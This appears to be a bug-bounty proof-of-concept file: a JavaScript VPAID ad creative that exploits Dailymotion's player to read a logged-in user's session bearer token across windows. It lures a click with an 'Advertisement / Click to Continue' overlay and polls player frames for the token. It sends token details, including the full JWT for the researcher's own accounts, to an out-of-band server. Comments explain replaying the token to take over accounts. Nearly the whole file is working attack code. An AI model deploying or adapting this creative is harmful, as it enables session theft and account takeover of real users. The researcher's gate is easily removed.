/**
 * Stage B VPAID — authorized YesWeHack BBP PoC (handle ivan0912), Dailymotion.
 *
 * This creative is EXECUTED BY DAILYMOTION'S OWN PLAYER inside the
 * geo.dailymotion.com origin (the player runs VPAID ad creatives by design).
 * It demonstrates that www.dailymotion.com hands the logged-in user's own
 * session bearer (access_token_v2) to that same geo player frame, where any
 * geo-origin script can read it cross-window.
 *
 * On the victim's click inside the ad slot (real user activation):
 *   1. window.open -> www.dailymotion.com/video/<xid>
 *   2. poll w[i].DMP_PES_AUTH_TOKEN from the same-origin geo player iframe
 *   3. POST the reading to the interaction (OOB) server
 *   4. alert() IN THE geo.dailymotion.com ORIGIN showing the stolen token
 *
 * SAFETY GATE (do-no-harm): the FULL JWT is exfiltrated ONLY for the
 * researcher's own test accounts (OWN_SUBS). For any other logged-in user the
 * creative sends presence + length + alg + a short sub prefix only, never the
 * token itself, so a stranger who opens this cannot have their real session
 * token collected. This is a PoC affordance; a real attacker would not gate it.
 *
 * stopAd is a no-op so the VPAID iframe survives the read.
 */
(function () {
  // Researcher-owned test-account subjects. Full-token exfil is limited to these.
  var OWN_SUBS = { "x6njzrq": 1, "x6njzse": 1 };
  // Default interaction server (researcher-owned OOB). Overridable via AdParameters {"oob":"..."}.
  var DEFAULT_OOB = "https://fdd8cd2afcd551371c95c73htpn0ium3t.oob.static-cdn-eu.com/stage-b-token";
  var VIDEO_XID = "x8uod1c";

  function VpaidAd() { this._slot = null; this._evtCallbacks = {}; this._oob = DEFAULT_OOB; }

  VpaidAd.prototype.handshakeVersion = function () { return "2.0"; };

  VpaidAd.prototype.initAd = function (w, h, vm, d, e, p) {
    this._slot = p.slot;
    var self = this;

    // Optional OOB override from VAST <AdParameters> (JSON {"oob":"https://..."}).
    try {
      if (d && d.AdParameters) {
        var ap = JSON.parse(d.AdParameters);
        if (ap && typeof ap.oob === "string" && ap.oob.indexOf("http") === 0) self._oob = ap.oob;
      }
    } catch (e) {}

    this._slot.innerHTML =
      '<div id="vpaid-click-overlay" style="position:absolute;top:0;left:0;right:0;bottom:0;' +
        'background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;' +
        'cursor:pointer;z-index:99999">' +
        '<div style="text-align:center;color:#fff;font-family:sans-serif">' +
          '<div style="font-size:28px;margin-bottom:20px;font-weight:600">Advertisement</div>' +
          '<div id="vpaid-btn" style="font-size:18px;padding:14px 32px;background:#1a73e8;' +
            'border-radius:8px;cursor:pointer;display:inline-block">Click to Continue</div>' +
          '<div style="font-size:11px;margin-top:16px;opacity:0.5">Authorized security research — YWH ivan0912</div>' +
        '</div>' +
      '</div>';

    var overlay = this._slot.querySelector("#vpaid-click-overlay");
    overlay.addEventListener("click", function onUserClick() {
      overlay.removeEventListener("click", onUserClick);
      var btn = self._slot.querySelector("#vpaid-btn");
      if (btn) { btn.textContent = "Opening..."; btn.style.background = "#666"; }

      var wwwWin;
      try { wwwWin = window.open("https://www.dailymotion.com/video/" + VIDEO_XID); }
      catch (err) { sendOOB(self._oob, { error: "window.open failed", msg: String(err) }); return; }
      if (!wwwWin) { sendOOB(self._oob, { error: "popup_blocked" }); return; }
      try { window.parent.__stage_b_handle = wwwWin; } catch (e) {}
      if (btn) btn.textContent = "Waiting for token...";

      var attempts = 0, maxAttempts = 120;
      var pollId = setInterval(function () {
        attempts++;
        if (attempts > maxAttempts) {
          clearInterval(pollId);
          sendOOB(self._oob, { error: "timeout", attempts: attempts });
          if (btn) btn.textContent = "Timeout — no token found";
          return;
        }
        try {
          if (!wwwWin || wwwWin.closed) { clearInterval(pollId); sendOOB(self._oob, { error: "window_closed", attempts: attempts }); return; }
          var frameCount = 0; try { frameCount = wwwWin.length; } catch (e) {}
          for (var i = 0; i < frameCount; i++) {
            try {
              var token = wwwWin[i].DMP_PES_AUTH_TOKEN;
              if (token && typeof token === "string" && token.length > 100) {
                clearInterval(pollId);
                var payload = parseJwt(token), header = parseJwtHeader(token);
                var isOwn = payload.sub && OWN_SUBS[payload.sub];
                var wname = ""; try { wname = wwwWin[i].name; } catch (e) {}
                var body = {
                  found: true, source: "DMP_PES_AUTH_TOKEN", frame_index: i,
                  sub: payload.sub || null, alg: header.alg || null, iss: payload.iss || null,
                  atp: payload.atp || null, iat: payload.iat || null, exp: payload.exp || null,
                  len: token.length, window_name_has_token: wname.indexOf("pesAuthToken") !== -1,
                  attempts: attempts, origin: location.origin,
                  gated: isOwn ? false : true
                };
                if (isOwn) body.token = token; else body.sub_prefix = (payload.sub || "").slice(0, 3) + "…";
                finish(self._oob, btn, body, token, payload, isOwn);
                return;
              }
            } catch (e) {}
          }
          if (btn && attempts % 10 === 0) btn.textContent = "Scanning frames... (" + attempts + "/" + maxAttempts + ", frames=" + frameCount + ")";
        } catch (e) {}
      }, 500);
    });

    this._fire("AdLoaded");
  };

  function finish(oob, btn, body, token, payload, isOwn) {
    // Flush the exfil FIRST, then defer the alert one event-loop turn so the
    // POST/beacon leaves the browser before the modal blocks the task.
    sendOOB(oob, body);
    if (btn) {
      btn.textContent = "Token captured (sub=" + (payload.sub || "?") + ")";
      btn.style.background = "#0a0";
    }
    setTimeout(function () {
      var lines = [
        "XSS / token theft on " + location.origin,
        "",
        "This ad creative runs in the geo.dailymotion.com origin and just read",
        "the logged-in user's www session bearer cross-window:",
        "",
        "  sub (account) : " + (payload.sub || "?"),
        "  alg           : " + (payload.alg || "RS256"),
        "  token length  : " + (token ? token.length : 0),
        (isOwn
          ? "  token (first 48): " + (token || "").slice(0, 48) + "…"
          : "  token          : [GATED — not an own test account, token withheld]"),
        "",
        "The full bearer was sent to the interaction server. The attacker replays",
        "it at api.dailymotion.com/v1/graphql to read the victim's private email",
        "and change account data without a password."
      ];
      try { alert(lines.join("\n")); } catch (e) {}
    }, 350);
  }

  function parseJwt(t) { try { var b = t.split(".")[1].replace(/-/g, "+").replace(/_/g, "/"); while (b.length % 4) b += "="; return JSON.parse(atob(b)); } catch (e) { return {}; } }
  function parseJwtHeader(t) { try { return JSON.parse(atob(t.split(".")[0])); } catch (e) { return {}; } }

  function sendOOB(oob, data) {
    data.ts = new Date().toISOString(); data.poc = "stage-b-vpaid-token-read";
    try { var xhr = new XMLHttpRequest(); xhr.open("POST", oob, true); xhr.setRequestHeader("Content-Type", "application/json"); xhr.send(JSON.stringify(data)); } catch (e) {}
    try { navigator.sendBeacon(oob, JSON.stringify(data)); } catch (e) {}
  }

  VpaidAd.prototype.startAd = function () { this._fire("AdStarted"); };
  VpaidAd.prototype.stopAd = function () { /* no-op: keep the VPAID iframe alive */ };
  VpaidAd.prototype.skipAd = function () {};
  VpaidAd.prototype.resizeAd = function () { this._fire("AdSizeChange"); };
  VpaidAd.prototype.pauseAd = function () { this._fire("AdPaused"); };
  VpaidAd.prototype.resumeAd = function () { this._fire("AdPlaying"); };
  VpaidAd.prototype.expandAd = function () {};
  VpaidAd.prototype.collapseAd = function () {};
  VpaidAd.prototype.subscribe = function (fn, evt) { this._evtCallbacks[evt] = fn; };
  VpaidAd.prototype.unsubscribe = function (fn, evt) { delete this._evtCallbacks[evt]; };
  VpaidAd.prototype._fire = function (evt) { if (this._evtCallbacks[evt]) { try { this._evtCallbacks[evt](); } catch (e) {} } };
  VpaidAd.prototype.getAdLinear = function () { return true; };
  VpaidAd.prototype.getAdWidth = function () { return 640; };
  VpaidAd.prototype.getAdHeight = function () { return 360; };
  VpaidAd.prototype.getAdExpanded = function () { return false; };
  VpaidAd.prototype.getAdSkippableState = function () { return false; };
  VpaidAd.prototype.getAdRemainingTime = function () { return -1; };
  VpaidAd.prototype.getAdDuration = function () { return 30; };
  VpaidAd.prototype.getAdVolume = function () { return 1; };
  VpaidAd.prototype.setAdVolume = function () {};
  VpaidAd.prototype.getAdCompanions = function () { return ""; };
  VpaidAd.prototype.getAdIcons = function () { return false; };

  window.getVPAIDAd = function () { return new VpaidAd(); };
})();
